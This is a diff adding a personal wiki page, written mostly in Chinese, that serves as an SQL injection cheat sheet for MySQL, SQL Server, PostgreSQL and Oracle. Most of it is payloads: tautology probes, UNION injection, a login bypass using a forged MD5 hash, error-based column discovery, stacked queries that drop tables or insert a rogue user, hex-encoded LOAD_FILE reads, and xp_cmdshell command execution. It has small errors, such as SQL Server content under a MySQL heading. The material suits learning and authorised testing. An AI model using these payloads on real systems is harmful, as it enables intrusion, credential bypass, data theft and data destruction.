@@ -1,0 +1,317 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
+        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
+        <title>SqlInject - Wiki | janes</title>
+        <meta name="keywords" content=""/>
+        <meta name="description" content=""/>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    </head>
+
+    <body>
+        <div id="container">
+            
+<div id="header">
+  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;SqlInject</div>
+</div>
+<div class="clearfix"></div>
+<div id="title">SqlInject</div>
+  <div id="content">
+  <h2 id="sql">理解 SQL 注入</h2>
+<p>SQL数据哭将单引号字符(')解析成代码与数据间的分界线：单引号外面的内容均是需要运行的代码，而用单引号引起的内容均是数据。</p>
+<h3 id="_1">构造动态字符串</h3>
+<ul>
+<li>
+<p>转义字符处理不当</p>
+</li>
+<li>
+<p>类型处理不当</p>
+</li>
+<li>
+<p>查询语句组装不当</p>
+</li>
+<li>
+<p>错误处理不当</p>
+</li>
+<li>
+<p>多个提交处理不当</p>
+</li>
+</ul>
+<h3 id="_2">不安全的数据库配置</h3>
+<hr />
+<ul>
+<li>M: MySQL</li>
+<li>S: SQL Server</li>
+<li>P: PostgreSQL</li>
+<li>O: Oracle</li>
+</ul>
+<h3 id="1-sql">1. 确认sql注入</h3>
+<p><strong> 根据需要添加 "(", ")" </strong></p>
+<ul>
+<li>
+<p>字符串内联注入</p>
+<ul>
+<li>'</li>
+<li>1' or '1'='1 {and}</li>
+<li>1' or '1'='2</li>
+</ul>
+</li>
+<li>
+<p>数字值内联注入</p>
+<ul>
+<li>'</li>
+<li>2+1 {-}</li>
+<li>1+0</li>
+<li>1 or 1=1 {and}</li>
+<li>1 or 1=2</li>
+</ul>
+</li>
+<li>
+<p>数据库注释</p>
+<ul>
+<li>-- (MSOP)</li>
+<li>/* */ (MSOP)</li>
+<li>/*!code */ {M}</li>
+</ul>
+<blockquote>
+<p>SELECT /*!32302 1/0 */ 1 FROM tablename =&gt; division by o error, if version &gt; 3.23.02</p>
+</blockquote>
+<ul>
+<li># {M}</li>
+</ul>
+</li>
+<li>
+<p>数据库连接运算符</p>
+<ul>
+<li>
+<p>MySQL:</p>
+<ul>
+<li>'ab'='a' 'b'</li>
+<li>CONCAT(str1, str2, str3)</li>
+</ul>
+<blockquote>
+<p>SELECT CONCAT(login, password) FROM members</p>
+</blockquote>
+</li>
+<li>
+<p>SQL Server:</p>
+<ul>
+<li>'ab'='a'+'b'</li>
+</ul>
+</li>
+<li>Oracle, PostgreSQL:<ul>
+<li>'ab'='a'||'b'</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>堆叠查询</p>
+<ul>
+<li>; {S}</li>
+</ul>
+<blockquote>
+<p>SELECT * FROM members; DROP member--</p>
+</blockquote>
+</li>
+<li>
+<p>if语句</p>
+<ul>
+<li>IF(condition, true-part, false-part) {M}</li>
+</ul>
+<blockquote>
+<p>SELECT IF(1=1,'true','false')</p>
+</blockquote>
+<ul>
+<li>IF condition true-part ELSE false-part {S}</li>
+</ul>
+<blockquote>
+<p>IF (1=1) SELECT 'true' ELSE SELECT 'false'</p>
+</blockquote>
+<ul>
+<li>attack sample</li>
+</ul>
+<blockquote>
+<p>if ((select user)='sa' OR (select user)='dbo') select 1 else select 1/0 {S}</p>
+</blockquote>
+</li>
+<li>
+<p>整数的使用</p>
+<ul>
+<li>0xHEXNUMBER {SM}<ul>
+<li>SELECT CHAR(0x66) {S}</li>
+<li>SELECT 0x5045 {M} --这不是整数而是16进制串</li>
+<li>SELECT 0x50+0x45 {M} --现在是整数了</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>没有引号的字符串</p>
+<ul>
+<li>CHAR {SM}</li>
+<li>CONCAT {M}</li>
+</ul>
+<blockquote>
+<p>SELECT CONCAT(CHAR(75),CHAR(76)) =&gt; 'KL'</p>
+</blockquote>
+<ul>
+<li>0x457578 {M} --16进制字符串</li>
+<li>attack sample</li>
+</ul>
+<blockquote>
+<p>SELECT LOAD_FILE(0x633A5C626F6F742E696E69) {M} =&gt; 'c:\bot.ini'</p>
+</blockquote>
+</li>
+<li>
+<p>字符串Modification</p>
+<ul>
+<li>ASCII() {SMP}</li>
+<li>CHAR() {SM}</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-union">2. UNION注入</h3>
+<ul>
+<li>
+<p>sample</p>
+<blockquote>
+<p>' union select 1, 'anotheruser', 'not matter', 1--</p>
+</blockquote>
+</li>
+<li>
+<p>语言处理</p>
+<ul>
+<li>Hex() {M}</li>
+</ul>
+</li>
+<li>
+<p>绕过MD5哈希检查 {MSP}</p>
+<p>username:admin</p>
+<p>password:1234</p>
+<blockquote>
+<p>' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055</p>
+</blockquote>
+<p>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</p>
+</li>
+<li>
+<p>基于错误-探测字段名</p>
+<ul>
+<li>HAVING {S}<ul>
+<li>' HAVINT 1=1 --</li>
+<li>' GROUP BY table.columnfromerror1 HAVING 1=1 --</li>
+<li>' GROUP BY table.columnfromerror1, table.columnfromerror2 HAVING 1=1 --</li>
+<li>...</li>
+</ul>
+</li>
+<li>SELECT 中使用 ORDER BY 探测字段数 {MSO}<ul>
+<li>ORDER BY 1 --</li>
+<li>...</li>
+<li>ORDER BY N --</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-union">3. 数据类型、UNION、之类的</h3>
+<ul>
+<li>
+<p>提示：</p>
+<ul>
+<li>经常给UNION配上ALL使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</li>
+<li>如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，可以使用-1或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</li>
+<li>在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强</li>
+<li>盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（一般用户名的框中不会出现NULL）</li>
+</ul>
+</li>
+<li>
+<p>获取字段类型</p>
+<ul>
+<li>' union select sum(columntofind) from users-- {S}</li>
+</ul>
+<blockquote>
+<p>Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a <strong>varchar</strong> data type as an argument. 如果没有返回错误说明字段是数字类型</p>
+</blockquote>
+<ul>
+<li>可以使用CAST()和CONVERT()</li>
+</ul>
+<blockquote>
+<p>SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--</p>
+</blockquote>
+<ul>
+<li>类型查询</li>
+</ul>
+<blockquote>
+<p>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 \–-</p>
+</blockquote>
+<p>没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。</p>
+<blockquote>
+<p>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 \–-</p>
+</blockquote>
+<p>没报错 – 第一个字段是integer类型。</p>
+<blockquote>
+<p>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --</p>
+</blockquote>
+<p>报错 – 第二个字段不是integer类型</p>
+<blockquote>
+<p>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 \–-</p>
+</blockquote>
+<p>没报错 – 第二个字段是string类型。</p>
+<blockquote>
+<p>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 \–-</p>
+</blockquote>
+<p>报错 – 第三个字段不是integer</p>
+<p>……</p>
+<p>Microsoft OLE DB Provider for SQL Server error '80040e07' Explicit conversion from data type int to image is not allowed.</p>
+<p>在遇到union错误之前会先遇到convert()错误，所以先使用convert()再用union</p>
+</li>
+<li>
+<p>简单的注入{MSO}</p>
+<ul>
+<li>'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*</li>
+</ul>
+</li>
+<li>
+<p>有用的函数、信息收集、内置程序、大量注入笔记</p>
+<ul>
+<li>@@version(MS)</li>
+</ul>
+<p>数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。</p>
+<ul>
+<li>INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-mysql">4. MySQL笔记</h3>
+<ul>
+<li>
+<p>sample</p>
+<ul>
+<li>
+<p>SELECT * FROM master..sysprocesses /<em>WHERE spid=@@SPID</em>/</p>
+</li>
+<li>
+<p>DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0</p>
+</li>
+</ul>
+<p>HOST_NAME() IS_MEMBER (Transact-SQL)
+IS_SRVROLEMEMBER (Transact-SQL)
+OPENDATASOURCE (Transact-SQL)</p>
+<ul>
+<li>INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"</li>
+</ul>
+</li>
+</ul>
+</div>
+
+        </div>
+        <div id="footer">
+            <span>
+                Copyright © 2012-2016 .
+                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
+            </span>
+        </div>
+        
+    </body>
+</html>
